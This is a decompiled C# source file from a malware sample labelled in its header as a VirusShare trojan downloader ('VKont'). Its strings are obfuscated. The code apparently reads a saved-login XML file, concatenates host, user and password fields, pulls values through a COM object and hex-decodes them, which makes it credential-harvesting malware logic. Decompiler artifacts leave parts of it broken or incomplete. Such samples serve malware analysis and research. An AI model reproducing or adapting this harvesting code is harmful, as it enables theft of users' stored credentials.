// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7761CAE9-D290-48D9-A44C-5C95C5289DD6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Downloader.MSIL.VKont.a-1d4cb0f0a33db378f9e4ae1b0f91ee4baabf5f1a669646e1278e016241a1452a.exe

using \u0001;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Xml;

namespace \u0004
{
  internal sealed class \u0004
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;

    public static string \u0002()
    {
      XmlDocument xmlDocument = new XmlDocument();
      object Left = (object) null;
      string str1 = \u0004.\u0004.\u0001(347);
      string str2 = Interaction.Environ(\u0004.\u0004.\u0001(4535)) + \u0004.\u0004.\u0001(4548);
      if (File.Exists(str2))
      {
        try
        {
          xmlDocument.Load(str2);
          XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName(\u0004.\u0004.\u0001(4577));
          XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName(\u0004.\u0004.\u0001(4590));
          XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName(\u0004.\u0004.\u0001(4599));
          int num = checked (elementsByTagName1.Count - 1);
          int i = 0;
          while (i <= num)
          {
            Left = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Left, (object) \u0004.\u0004.\u0001(4612)), (object) elementsByTagName1[i].InnerText), (object) \u0004.\u0004.\u0001(1046)), (object) \u0004.\u0004.\u0001(3986)), (object) elementsByTagName2[i].InnerText), (object) \u0004.\u0004.\u0001(1046)), (object) \u0004.\u0004.\u0001(4003)), (object) elementsByTagName3[i].InnerText), (object) \u0004.\u0004.\u0001(4629));
            checked { ++i; }
          }
          str1 = Conversions.ToString(Left);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        TextBox textBox = \u0002.\u0002.\u0002().\u0002().\u0002();
        textBox.Text = textBox.Text + \u0004.\u0004.\u0001(4642) + str1 + \u0004.\u0004.\u0001(4683);
      }
      return str1;
    }

    public static object \u0002([In] ref string obj0)
    {
      object obj1;
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(\u0003.\u0002(4591), \u0003.\u0002(246)));
        string MemberName = \u0003.\u0002(4612);
        object[] objArray = new object[1]{ (object) obj0 };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj2 = NewLateBinding.LateGet(objectValue, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          obj0 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        obj1 = RuntimeHelpers.GetObjectValue(obj2);
        goto label_9;
label_4:
        num1 = -1;
        switch (num2)
        {
          case 2:
            obj1 = (object) null;
            goto label_9;
        }
      }
      catch (Exception ex) when (
      {
        // ISSUE: unable to correctly present filter
        int num3;
        if (ex is Exception & num2 != 0 & num3 == 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      object obj3 = obj1;
      if (num1 == 0)
        return obj3;
      ProjectData.ClearProjectError();
      return obj3;
    }

    public static string \u0002([In] string obj0)
    {
      object Left = (object) null;
      object LoopForResult;
      object CounterResult;
      object Counter;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, (object) Strings.Len(obj0), (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          object Right = (object) Strings.Mid(obj0, Conversions.ToInteger(CounterResult), 2);
          Left = Operators.ConcatenateObject(Left, (object) Strings.Chr(checked ((int) Math.Round(Conversion.Val(Operators.ConcatenateObject((object) \u0004.\u0004.\u0001(4726), Right))))));
          CounterResult = Operators.AddObject(CounterResult, (object) 1);
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      return Conversions.ToString(Left);
    }

    public static string \u0003()
    {
      string str1 = \u0004.\u0004.\u0001(4731);
      string str2 = \u0004.\u0004.\u0001(4788);
      string text = \u0004.\u0004.\u0001(1046);
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(text);
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(\u0004.\u0004.\u0001(4845));
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(text);
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(Conversions.ToString(Operators.ConcatenateObject((object) \u0004.\u0004.\u0001(3986), \u0004.\u0004.\u0002(ref str1))));
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(text);
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(\u0004.\u0004.\u0001(4003) + \u0004.\u0004.\u0002(Conversions.ToString(\u0004.\u0004.\u0002(ref str2))));
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(text);
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(\u0004.\u0004.\u0001(4886));
      \u0002.\u0002.\u0002().\u0002().\u0002().AppendText(text);
      string str3;
      return str3;
    }

    static \u0004() => \u0001.\u0002.\u0002();
  }
}
